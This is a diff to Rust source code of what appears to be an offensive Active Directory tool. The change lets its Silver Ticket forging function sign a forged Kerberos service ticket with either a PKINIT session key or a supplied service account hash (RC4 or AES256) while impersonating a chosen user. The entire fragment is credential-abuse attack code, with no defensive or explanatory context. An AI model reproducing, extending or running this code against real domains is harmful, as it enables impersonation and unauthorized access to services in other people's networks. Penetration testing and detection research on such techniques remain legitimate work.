@@ -23,33 +23,41 @@ use crate::validate;
 pub async fn forge_silver_ticket(config: &ForgeConfig, target_spn: &str) -> Result<ForgeResult> {
     info!("[silver] Forging Silver Ticket for SPN: {}", target_spn);
 
-    let service_hash = config.service_hash.as_deref().ok_or_else(|| {
-        OverthroneError::TicketForge(
-            "Service account hash (--service-hash) is required for Silver Ticket".into(),
-        )
-    })?;
-
     let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
         OverthroneError::TicketForge(
             "Domain SID (--domain-sid) is required for Silver Ticket".into(),
         )
     })?;
-
     validate::validate_sid_format(domain_sid)?;
 
-    let key_bytes = hex::decode(service_hash.trim())
-        .map_err(|e| OverthroneError::TicketForge(format!("Invalid hash: {e}")))?;
-
-    let etype = match key_bytes.len() {
-        16 => ETYPE_RC4_HMAC,
-        32 => ETYPE_AES256_CTS,
-        _ => {
-            return Err(OverthroneError::TicketForge(format!(
-                "Service hash must be 16 (RC4) or 32 (AES256) bytes, got {}",
-                key_bytes.len()
-            )));
-        }
-    };
+    let (key_bytes, etype) =
+        if let Some((ref session_key, session_etype)) = config.pkinit_session_key {
+            info!(
+                "[silver] Using PKINIT session key (etype={}, {} bytes)",
+                session_etype,
+                session_key.len()
+            );
+            (session_key.clone(), session_etype)
+        } else {
+            let service_hash = config.service_hash.as_deref().ok_or_else(|| {
+                OverthroneError::TicketForge(
+                    "Service account hash (--service-hash) is required for Silver Ticket".into(),
+                )
+            })?;
+            let key = hex::decode(service_hash.trim())
+                .map_err(|e| OverthroneError::TicketForge(format!("Invalid hash: {e}")))?;
+            let etype = match key.len() {
+                16 => ETYPE_RC4_HMAC,
+                32 => ETYPE_AES256_CTS,
+                _ => {
+                    return Err(OverthroneError::TicketForge(format!(
+                        "Service hash must be 16 (RC4) or 32 (AES256) bytes, got {}",
+                        key.len()
+                    )));
+                }
+            };
+            (key, etype)
+        };
 
     let realm = config.domain.to_uppercase();
     let impersonate = config.effective_impersonate();
